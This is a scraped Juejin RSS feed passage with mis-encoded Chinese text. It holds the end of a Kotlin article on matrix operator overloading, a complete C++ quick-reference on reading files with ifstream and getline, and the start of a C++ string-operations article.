        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(other: <span class="hljs-type">Matrix</span>)</span></span>: Matrix {
            require(cols == other.rows)
            <span class="hljs-keyword">return</span> Matrix(rows, other.cols) { i, j -&gt;
                (<span class="hljs-number">0</span> until cols).sumOf { k -&gt; <span class="hljs-keyword">this</span>[i, k] * other[k, j] }
            }
        }
        
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.joinToString(<span class="hljs-string">"\n"</span>) { row -&gt; row.joinToString(<span class="hljs-string">" "</span>) }
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateMatrixOperations</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> a = Matrix(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) { i, j -&gt; (i * <span class="hljs-number">2</span> + j + <span class="hljs-number">1</span>).toDouble() }
        <span class="hljs-keyword">val</span> b = Matrix(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) { i, j -&gt; (i + j * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>).toDouble() }
        
        println(<span class="hljs-string">"çŸ©é˜µ A:\n<span class="hljs-variable">$a</span>"</span>)
        println(<span class="hljs-string">"çŸ©é˜µ B:\n<span class="hljs-variable">$b</span>"</span>)
        println(<span class="hljs-string">"A + B:\n<span class="hljs-subst">${a + b}</span>"</span>)
        println(<span class="hljs-string">"A Ã— B:\n<span class="hljs-subst">${a * b}</span>"</span>)
    }
}

<span class="hljs-comment">// æµ‹è¯•æ‰€æœ‰é«˜çº§ç‰¹æ€§</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"=== ç¼–è¯‘å™¨åŸç†æ¼”ç¤º ==="</span>)
    testCompilerPhases()
    
    println(<span class="hljs-string">"\n=== è¯­è¨€è®¾è®¡å“²å­¦æ¼”ç¤º ==="</span>)
    FunctionalOOFusion().demonstrateImmutability()
    
    println(<span class="hljs-string">"\n=== é«˜çº§ç±»å‹ç³»ç»Ÿæ¼”ç¤º ==="</span>)
    HigherKindedSimulation().demonstrateSimulatedHKT()
    
    println(<span class="hljs-string">"\n=== è·¯å¾„ä¾èµ–ç±»å‹æ¼”ç¤º ==="</span>)
    PathDependentTypeSimulation().demonstratePathDependentTypes()
    AdvancedPathDependentTypes().demonstrateTypeSafeIds()
    
    println(<span class="hljs-string">"\n=== å…ƒå¯¹è±¡åè®®æ¼”ç¤º ==="</span>)
    testAdvancedMOP()
    
    println(<span class="hljs-string">"\n=== è‡ªå®šä¹‰æ“ä½œç¬¦æ¼”ç¤º ==="</span>)
    CustomOperatorsDeepDive().demonstrateMatrixOperations()
}
</code></pre>
<h4 data-id="heading-12"><strong>æˆä¸º Kotlin è¯­è¨€ä¸“å®¶çš„è·¯å¾„</strong></h4>
<p>ä½ ç°åœ¨å·²ç»è¾¾åˆ°äº† Kotlin çš„ä¸“å®¶çº§åˆ«ï¼æ¥ä¸‹æ¥å¯ä»¥ï¼š</p>
<ol>
<li><strong>ç ”ç©¶ Kotlin ç¼–è¯‘å™¨æºç </strong>ï¼šç†è§£æ¯ä¸ªç¼–è¯‘é˜¶æ®µçš„å®ç°</li>
<li><strong>å‚ä¸ Kotlin è¯­è¨€è§„èŒƒåˆ¶å®š</strong>ï¼šè´¡çŒ®è¯­è¨€è®¾è®¡è®¨è®º</li>
<li><strong>å¼€å‘é«˜çº§ç¼–è¯‘å™¨æ’ä»¶</strong>ï¼šåˆ›å»ºé¢†åŸŸç‰¹å®šè¯­è¨€æ‰©å±•</li>
<li><strong>ç ”ç©¶ Kotlin ç±»å‹ç³»ç»Ÿå½¢å¼åŒ–</strong>ï¼šç”¨æ•°å­¦æ–¹æ³•è¯æ˜ç±»å‹å®‰å…¨</li>
<li><strong>æ¢ç´¢ Kotlin å¤šå¹³å°å‰æ²¿</strong>ï¼šç ”ç©¶æ–°çš„ç›®æ ‡å¹³å°æ”¯æŒ</li>
<li><strong>è´¡çŒ® Kotlin ç”Ÿæ€ç³»ç»Ÿ</strong>ï¼šåˆ›å»ºé‡è¦çš„åº“å’Œæ¡†æ¶</li>
</ol>
<p>ä½ å·²ç»ä» Kotlin ä½¿ç”¨è€…æˆé•¿ä¸ºå¯ä»¥å½±å“è¯­è¨€å‘å±•çš„ä¸“å®¶ï¼ç»§ç»­æ·±å…¥æ¢ç´¢ï¼Œæ¨åŠ¨ Kotlin è¯­è¨€çš„å‘å±•è¾¹ç•Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€C++å¿…çŸ¥å¿…ä¼šã€‘è¯»å–æ–‡ä»¶é€Ÿè®°]]></title>    <link>https://juejin.cn/post/7576018857368600619</link>    <guid>https://juejin.cn/post/7576018857368600619</guid>    <pubDate>2025-11-24T11:06:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576018857368600619" data-draft-id="7576098886860144683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€C++å¿…çŸ¥å¿…ä¼šã€‘è¯»å–æ–‡ä»¶é€Ÿè®°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-24T11:06:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€C++å¿…çŸ¥å¿…ä¼šã€‘è¯»å–æ–‡ä»¶é€Ÿè®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:06:25.000Z" title="Mon Nov 24 2025 11:06:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¹²äº†è¿™ä¹ˆå¤šå¹´C++å¼€å‘ï¼Œæ¯æ¬¡é‡åˆ°æ–‡ä»¶è¯»å–è¿˜å¾—å»é—®AIï¼ŒçœŸæ˜¯æƒ­æ„§ï¼ä»Šå¤©æˆ‘å†³å®šæŠŠè¿™äº›åŸºç¡€çš„æ–‡ä»¶æ“ä½œå‡½æ•°èƒŒä¸‹æ¥ï¼Œæ•´ç†æˆè¿™ä»½é€Ÿè®°æŒ‡å—ã€‚</p>
</blockquote>
<p>åœ¨C++ä¸­ï¼Œæ–‡ä»¶æ“ä½œä¸»è¦ä¾èµ–äº <code>&lt;fstream&gt;</code> å¤´æ–‡ä»¶ä¸­çš„ç±»ã€‚æŒæ¡æ–‡ä»¶è¯»å–æ˜¯C++ç¼–ç¨‹ä¸­çš„åŸºç¡€æŠ€èƒ½ä¹‹ä¸€ã€‚</p>
<hr/>
<h2 data-id="heading-0">å¿…é¡»æŒæ¡çš„ç±»å’Œå¤´æ–‡ä»¶</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span>   <span class="hljs-comment">// ä¸»è¦å¤´æ–‡ä»¶</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  <span class="hljs-comment">// ç”¨äºè¾“å‡ºä¿¡æ¯</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span>    <span class="hljs-comment">// ç”¨äºè¯»å–æ•´è¡Œæ–‡æœ¬</span></span>
</code></pre>
<h3 data-id="heading-1">ä¸‰ç±»æ–‡ä»¶æµï¼š</h3>
<ul>
<li><code>ifstream</code>ï¼šè¯»å–æ–‡ä»¶ï¼ˆè¾“å…¥æµï¼‰</li>
<li><code>ofstream</code>ï¼šå†™å…¥æ–‡ä»¶ï¼ˆè¾“å‡ºæµï¼‰</li>
<li><code>fstream</code>ï¼šè¯»å†™æ–‡ä»¶ï¼ˆåŒå‘æµï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-2">å¿…é¡»æŒæ¡çš„å‡½æ•°</h2>
<h3 data-id="heading-3">1. æ‰“å¼€æ–‡ä»¶</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename, ios::openmode mode)</span></span>;
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">ifstream fin;
fin.<span class="hljs-built_in">open</span>(<span class="hljs-string">"data.txt"</span>);
</code></pre>
<h3 data-id="heading-4">2. åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ‰“å¼€æˆåŠŸ</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_open</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">if</span> (!fin.<span class="hljs-built_in">is_open</span>()) {
    cerr &lt;&lt; <span class="hljs-string">"æ‰“å¼€æ–‡ä»¶å¤±è´¥ï¼"</span> &lt;&lt; endl;
}
</code></pre>
<h3 data-id="heading-5">3. å…³é—­æ–‡ä»¶</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">fin.<span class="hljs-built_in">close</span>();
</code></pre>
<h3 data-id="heading-6">4. è¯»å–æ–‡ä»¶å†…å®¹</h3>
<h4 data-id="heading-7">é€è¡Œè¯»å–ï¼ˆæœ€å¸¸ç”¨ï¼‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">getline</span>(fin, line); <span class="hljs-comment">// line æ˜¯ string ç±»å‹</span>
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">string line;
<span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(fin, line)) {
    cout &lt;&lt; line &lt;&lt; endl;
}
</code></pre>
<h4 data-id="heading-8">æŒ‰ç©ºæ ¼åˆ†éš”è¯»å–ï¼ˆé€‚åˆè¯»å–æ•°å­—æˆ–å•è¯ï¼‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">int</span> num;
<span class="hljs-keyword">while</span> (fin &gt;&gt; num) {
    cout &lt;&lt; num &lt;&lt; endl;
}
</code></pre>
<h4 data-id="heading-9">é€å­—ç¬¦è¯»å–</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">char</span> ch;
<span class="hljs-keyword">while</span> (fin.<span class="hljs-built_in">get</span>(ch)) {
    cout &lt;&lt; ch;
}
</code></pre>
<h3 data-id="heading-10">5. åˆ¤æ–­æ˜¯å¦è¯»å–åˆ°æ–‡ä»¶æœ«å°¾</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">eof</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">while</span> (!fin.<span class="hljs-built_in">eof</span>()) {
    <span class="hljs-built_in">getline</span>(fin, line);
    cout &lt;&lt; line &lt;&lt; endl;
}
</code></pre>
<hr/>
<h2 data-id="heading-11">ä½¿ç”¨å»ºè®®</h2>
<ul>
<li>æ¨èä¼˜å…ˆä½¿ç”¨ <code>ifstream</code> è¯»å–æ–‡æœ¬æ–‡ä»¶</li>
<li>è¯»å–æ–‡æœ¬å†…å®¹æ—¶ï¼Œ<code>getline()</code> æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•</li>
<li>ä½¿ç”¨å®Œæ–‡ä»¶ååŠ¡å¿…è°ƒç”¨ <code>close()</code>ï¼Œé¿å…èµ„æºæ³„éœ²</li>
<li>æ–‡ä»¶è·¯å¾„å»ºè®®ä½¿ç”¨ç»å¯¹è·¯å¾„æˆ–ç¡®ä¿æ–‡ä»¶å­˜åœ¨äºç¨‹åºè¿è¡Œç›®å½•ä¸­</li>
</ul>
<hr/>
<h2 data-id="heading-12">å®Œæ•´ç¤ºä¾‹ï¼šè¯»å–æ–‡æœ¬æ–‡ä»¶å¹¶é€è¡Œè¾“å‡º</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">ifstream <span class="hljs-title">fin</span><span class="hljs-params">(<span class="hljs-string">"example.txt"</span>)</span></span>;
    <span class="hljs-keyword">if</span> (!fin.<span class="hljs-built_in">is_open</span>()) {
        cerr &lt;&lt; <span class="hljs-string">"æ— æ³•æ‰“å¼€æ–‡ä»¶ï¼"</span> &lt;&lt; endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    string line;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(fin, line)) {
        cout &lt;&lt; line &lt;&lt; endl;
    }

    fin.<span class="hljs-built_in">close</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-13">é€Ÿè®°å£è¯€</h2>
<blockquote>
<p>è¯»æ–‡ä»¶ï¼Œç”¨ <code>ifstream</code>ï¼›<br/>
æ‰“å¼€å‰ï¼Œå…ˆåˆ¤æ–­ï¼›<br/>
è¯»å†…å®¹ï¼Œ<code>getline</code> å¥½ï¼›<br/>
ç»“æŸåï¼Œè®°å¾— <code>close</code>ï¼</p>
</blockquote>
<p>ä¸‹æ¬¡å†é‡åˆ°æ–‡ä»¶è¯»å–ï¼Œç›´æ¥çœ‹è¿™ä»½ç¬”è®°å°±è¡Œï¼Œä¸ç”¨å†åˆ°å¤„é—®AIäº†ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€C++å¿…çŸ¥å¿…ä¼šã€‘å­—ç¬¦ä¸²æ“ä½œé€Ÿè®°]]></title>    <link>https://juejin.cn/post/7576026767372173331</link>    <guid>https://juejin.cn/post/7576026767372173331</guid>    <pubDate>2025-11-24T11:09:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372173331" data-draft-id="7576098886860161067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€C++å¿…çŸ¥å¿…ä¼šã€‘å­—ç¬¦ä¸²æ“ä½œé€Ÿè®°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-24T11:09:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€C++å¿…çŸ¥å¿…ä¼šã€‘å­—ç¬¦ä¸²æ“ä½œé€Ÿè®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:09:36.000Z" title="Mon Nov 24 2025 11:09:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¹²äº†è¿™ä¹ˆå¤šå¹´C++ï¼Œæ¯æ¬¡å¤„ç†å­—ç¬¦ä¸²è¿˜å¾—æŸ¥æ–‡æ¡£ï¼ŒçœŸæ˜¯è¯´ä¸è¿‡å»ï¼ä»Šå¤©æˆ‘å†³å®šæŠŠè¿™äº›å¸¸ç”¨çš„å­—ç¬¦ä¸²æ“ä½œå‡½æ•°èƒŒä¸‹æ¥ï¼Œæ•´ç†æˆè¿™ä»½é€Ÿè®°æŒ‡å—ã€‚</p>
</blockquote>
<p>åœ¨C++ä¸­ï¼Œå­—ç¬¦ä¸²æ“ä½œä¸»è¦ä¾èµ–äº <code>&lt;string&gt;</code> å¤´æ–‡ä»¶ã€‚æŒæ¡å­—ç¬¦ä¸²å¤„ç†æ˜¯C++ç¼–ç¨‹ä¸­çš„æ ¸å¿ƒæŠ€èƒ½ä¹‹ä¸€ã€‚</p>
<hr/>
<h2 data-id="heading-0">å¿…é¡»æŒæ¡çš„å¤´æ–‡ä»¶</h2>
